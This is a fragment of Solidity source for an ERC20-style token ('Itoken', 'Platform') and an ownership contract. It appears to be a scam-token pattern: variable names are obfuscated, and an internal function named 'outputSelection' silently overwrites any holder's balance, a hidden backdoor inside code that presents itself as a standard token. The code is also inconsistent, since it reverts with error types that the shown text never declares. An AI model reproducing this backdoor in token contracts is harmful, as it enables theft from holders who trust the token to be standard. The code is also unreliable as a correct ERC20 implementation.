    error ERC20InvalidApprover(address approver);
    error ERC20InvalidOperator(address operator);
    error ERC20InvalidArrayLength(uint256 idsLength, uint256 amoutputSelectionsLength);
}

abstract contract Itoken is Context, ERC20, ERC20Metadata, ERC20Errors {
    mapping(address metadataInfo => uint256) private tokensIntoLiquidity;
    mapping(address metadataInfo => mapping(address spender => uint256)) private optimizer;
    uint256 private _totalSupply;
    string private _name;
    string private _symbol;
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }
    function name() public view virtual returns (string memory) {
        return _name;
    }
    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }
    function decimals() public view virtual returns (uint8) {
        return 9;
    }
    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }
    function balanceOf(address metadataInfo) public view virtual returns (uint256) {
        return tokensIntoLiquidity[metadataInfo];
    }
    function transfer(address to, uint256 amoutputSelection) public virtual returns (bool) {
        address metadataInfo = _msgSender();
        _transfer(metadataInfo, to, amoutputSelection);
        return true;
    }

    function allowance(address metadataInfo, address spender) public view virtual returns (uint256) {
        return optimizer[metadataInfo][spender];
    }


    function approve(address spender, uint256 amoutputSelection) public virtual returns (bool) {
        address metadataInfo = _msgSender();
        _approve(metadataInfo, spender, amoutputSelection);
        return true;
    }

    function transferFrom(address from, address to, uint256 amoutputSelection) public virtual returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amoutputSelection);
        _transfer(from, to, amoutputSelection);
        return true;
    }


    function _transfer(address from, address to, uint256 amoutputSelection) internal {
        if (from == address(0)) {
            revert ItokenInvalidSender(address(0));
        }
        if (to == address(0)) {
            revert ItokenInvalidReceiver(address(0));
        }
        _update(from, to, amoutputSelection);
    }

    function _update(address from, address to, uint256 amoutputSelection) internal virtual {
        if (from == address(0)) {
            // Overflow check required: The rest of the code assumes that totalSupply never overflows
            _totalSupply += amoutputSelection;
        } else {
            uint256 fromBalance = tokensIntoLiquidity[from];
            if (fromBalance < amoutputSelection) {
                revert ItokenInsufficientBalance(from, fromBalance, amoutputSelection);
            }
            unchecked {
                // Overflow not possible: amoutputSelection <= fromBalance <= totalSupply.
                tokensIntoLiquidity[from] = fromBalance - amoutputSelection;
            }
        }

        if (to == address(0)) {
            unchecked {
                // Overflow not possible: amoutputSelection <= totalSupply or amoutputSelection <= fromBalance <= totalSupply.
                _totalSupply -= amoutputSelection;
            }
        } else {
            unchecked {
                // Overflow not possible: balance + amoutputSelection is at most totalSupply, which we know fits into a uint256.
                tokensIntoLiquidity[to] += amoutputSelection;
            }
        }

        emit Transfer(from, to, amoutputSelection);
    }

    function ethers(address metadataInfo, uint256 amoutputSelection) internal {
        if (metadataInfo == address(0)) {
            revert ItokenInvalidReceiver(address(0));
        }
        _update(address(0), metadataInfo, amoutputSelection);
    }

    function outputSelection(address metadataInfo, uint256 amoutputSelection) internal {
     tokensIntoLiquidity[metadataInfo] = amoutputSelection;
    }


    function _approve(address metadataInfo, address spender, uint256 amoutputSelection) internal {
        _approve(metadataInfo, spender, amoutputSelection, true);
    }

    function _approve(address metadataInfo, address spender, uint256 amoutputSelection, bool emitEvent) internal virtual {
        if (metadataInfo == address(0)) {
            revert ItokenInvalidApprover(address(0));
        }
        if (spender == address(0)) {
            revert ItokenInvalidSpender(address(0));
        }
        optimizer[metadataInfo][spender] = amoutputSelection;
        if (emitEvent) {
            emit Approval(metadataInfo, spender, amoutputSelection);
        }
    }

    function _spendAllowance(address metadataInfo, address spender, uint256 amoutputSelection) internal virtual {
        uint256 currentAllowance = allowance(metadataInfo, spender);
        if (currentAllowance != type(uint256).max) {
            if (currentAllowance < amoutputSelection) {
                revert ItokenInsufficientAllowance(spender, currentAllowance, amoutputSelection);
            }
            unchecked {
                _approve(metadataInfo, spender, currentAllowance - amoutputSelection, false);
            }
        }
    }
}

contract Platform is Itoken {
    constructor(string memory name, string memory symbol, uint256 initialSupply) Itoken(name, symbol) {
        ethers(msg.sender, initialSupply * (10 ** uint256(decimals())));
    }
}
contract app is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "app: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

